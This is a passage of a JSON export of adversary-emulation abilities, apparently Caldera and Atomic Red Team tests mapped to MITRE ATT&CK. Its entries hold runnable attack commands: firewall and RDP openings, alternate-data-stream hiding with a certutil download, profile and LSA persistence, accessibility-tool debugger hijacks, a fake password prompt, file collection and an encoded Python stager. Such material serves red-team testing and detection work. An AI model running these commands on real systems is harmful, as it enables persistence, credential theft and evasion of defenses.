'#{windows.staging.location}\\s'; };\nif (Test-Path -Path $StageDir) {Remove-Item -Force -Recurse $StageDir};"], "code": null, "timeout": 300, "build_target": null, "platform": "windows", "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["file_search.sh"], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["if [ -d '#{linux.staging.location}' ]; then rm -rf '#{linux.staging.location}/.s'; fi;"], "code": null, "timeout": 300, "build_target": null, "platform": "linux", "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Automated Collection", "ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "technique_id": "T1119", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "info.created"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Advanced File Search and Stager", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will attempt to allow an executable through the system firewall located in the Users directory", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["f7ce09_AtomicTest.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["netsh advfirewall firewall delete rule name=\"Atomic Test\" | Out-Null; Remove-Item C:\\Users\\$env:UserName\\AtomicTest.exe -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item f7ce09_AtomicTest.exe -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "cfdcd33e3213f9c5a150b8b620d9d0f4", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Allow Executable Through Firewall Located in Non-Standard Location", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "c33bd0d7424951f39b73a1f5f491fe17", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Allow RDP Remote Assistance Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["netsh advfirewall reset >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes && netsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "280003641a5cddf916c4f2bf605a71d3", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Allow SMB and RDP on Microsoft Defender Firewall", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\" && extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe && findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe && certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt && makecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab && print /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe && reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg && regedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey && expand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat && esentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: NTFS File Attributes", "ability_id": "7950c18da2779fa38c0bddeb6d470466", "technique_id": "T1564.004", "tactic": "defense-evasion", "requirements": [], "name": "Alternate Data Streams (ADS)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:temp\\ammyy.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "08c16e90b1f129f1219361ab95b54f93", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "Ammyy Admin Software Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe.exe\"; Remove-Item $file1 -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Start-Process $file1 /S;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "7dabcbecab0334b115feefab1630f84a", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "AnyDesk Files Detected Test on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i \"s/# Atomic Red Team was here... T1546.004//\" ~/.profile"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo '# Atomic Red Team was here... T1546.004' >> ~/.profile", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "1091a1dcd359e4ad8d577e7d3d1a18b3", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "Append commands user shell profile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$oldprofile = cat $profile | Select-Object -skiplast 1; Set-Content $profile -Value $oldprofile"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Add-Content $profile -Value \"\"; Add-Content $profile -Value \"Start-Process calc.exe\"; powershell -Command exit", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: PowerShell Profile", "ability_id": "49a7502f9c667aa3af9c87f6ab1e68b3", "technique_id": "T1546.013", "tactic": "multiple", "requirements": [], "name": "Append malicious start-process cmdlet", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1547007_append_exe; FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`; if [ -z \"${FILE}\" ] ; then    exit 0; fi; mv /tmp/t1547007_loginwindow-backup.plist ${FILE}"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`; if [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi; echo save backup copy to /tmp/; cp ${FILE} /tmp/t1547007_loginwindow-backup.plist; echo before; plutil -p ${FILE}; echo overwriting...; /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications", "ability_id": "7a5720249df1912017c99a2df7f3d1a8", "technique_id": "T1547.007", "tactic": "multiple", "requirements": [], "name": "Append to existing loginwindow for Re-Opened Applications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i \"s/# Atomic Red Team was here! T1546.004//\" /etc/profile"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "01d1dfec9efbf1f20ee65df03209cf5b", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "Append to the system shell profile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: AppleScript", "ability_id": "0ed5491929cf9b5d9cf848dfeea869eb", "technique_id": "T1059.002", "tactic": "execution", "requirements": [], "name": "AppleScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: GUI Input Capture", "ability_id": "e3d4f78fc9dac33343b2f0865a8f8d45", "technique_id": "T1056.002", "tactic": "multiple", "requirements": [], "name": "AppleScript - Prompt User for Password", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["729b9b_AtomicShimx86.sdb", "729b9b_AtomicShimx86.sdb"], "parsers": [], "cleanup": ["sdbinst.exe -u 729b9b_AtomicShimx86.sdb >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sdbinst.exe 729b9b_AtomicShimx86.sdb", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Application Shimming", "ability_id": "d45d48dbea3384059e638eab6b03abb5", "technique_id": "T1546.011", "tactic": "multiple", "requirements": [], "name": "Application Shim Installation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Application Window Discovery", "ability_id": "5c65eec8-4839-4713-a4e1-86b2e75d1927", "technique_id": "T1010", "tactic": "discovery", "requirements": [], "name": "Application Window Discovery", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["msiexec /i PathToAtomicsFolder\\T1047\\bin\\tightvncinstaller.msi /qn /norestart"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /node:\"127.0.0.1\" product where \"name like 'Tightvnc%%'\" call uninstall", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "5caa8f9190e3ec3a6f948d70ce67a738", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "Application uninstall using WMIC", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "b5fe84fa9fb8216512867a039a61db20", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Applications Installed", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test submits a command to be run in the future by the `at` daemon.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: At", "ability_id": "596285d5302f5ad6527e7811d620bebf", "technique_id": "T1053.002", "tactic": "multiple", "requirements": [], "name": "At - Schedule a job", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "at 13:20 /interactive cmd", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: At", "ability_id": "1b82e5d4e4707c4923e7a0f8143b3186", "technique_id": "T1053.002", "tactic": "multiple", "requirements": [], "name": "At.exe Scheduled task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\"); Foreach ($item in $input_table); {;   $item = $item.trim();   reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\"); $Name = \"Debugger\"; $Value = \"C:\\windows\\system32\\cmd.exe\"; Foreach ($item in $input_table){;   $item = $item.trim();   $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\";   IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Accessibility Features", "ability_id": "4bdc05fe2f0006f86575053dc740edf3", "technique_id": "T1546.008", "tactic": "multiple", "requirements": [], "name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl restart auditd"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS ; auditctl -a always,exit -F arch=b32 -S execve -k CMDS; whoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\")", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "7ade8854cf5f27a38e6b9d9aba15e22b", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "Auditd keylogger", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates modification of auditd configuration files\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i '$ d' /etc/audisp/audispd.conf; if [ -f \"/etc/auditd.conf\" ]; then sed -i '$ d' /etc/auditd.conf; else sed -i '$ d' /etc/audit/auditd.conf; fi; sed -i '$ d' /etc/libaudit.conf"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf; if [ -f \"/etc/auditd.conf\" ]; then sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf; else sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf; fi ; sed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "fe3840e48a28eda88466867b6bb7dbea", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "Auditing Configuration Changes on Linux Host", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["864d47_package.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f; rm -force C:\\windows\\system32\\package.dll"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item 864d47_package.dll C:\\Windows\\System32\\; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Authentication Package", "ability_id": "2f8f26ef6caacf086dd9b7f7b5031fa5", "technique_id": "T1547.002", "tactic": "multiple", "requirements": [], "name": "Authentication Package", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\ADRecon.ps1 -Force -ErrorAction Ignore | Out-Null; Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-Expression $env:TEMP\\ADRecon.ps1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "76155f331bfb00e581a61edbeeafc661", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Automated AD Recon (ADRecon)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 && dir c: /b /s .docx | findstr /e .docx && for /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Automated Collection", "ability_id": "8495696b0a75577de442ba54bef343c1", "technique_id": "T1119", "tactic": "collection", "requirements": [], "name": "Automated Collection Command Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Automated Collection", "ability_id": 